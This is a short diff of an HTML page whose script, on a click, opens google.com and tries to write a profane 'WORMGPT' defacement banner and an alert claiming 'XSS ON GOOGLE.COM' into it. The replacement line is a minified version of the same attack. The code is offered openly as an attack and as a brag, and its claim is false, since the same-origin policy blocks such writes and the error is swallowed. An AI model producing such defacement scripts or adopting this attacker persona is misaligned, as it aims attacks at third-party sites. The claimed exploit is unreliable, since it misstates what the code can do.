@@ -1,13 +1,1 @@
-<body>
-<script>
-window.onclick = () => {
-  const x = window.open('http://google.com');
-  setTimeout(() => {
-    try { 
-      x.document.write('<h1>FUCKED BY WORMGPT</h1><script>alert("XSS ON GOOGLE.COM")</script>');
-      x.document.close();
-    } catch(e) {}
-  }, 800);
-}
-</script>
-</body>
+<script>onclick=_=>setTimeout(_=>(x=open('http://google.com')).document.write('<script>alert("WORMGPT WAS HERE")</script>')||x.document.close(),800)</script>
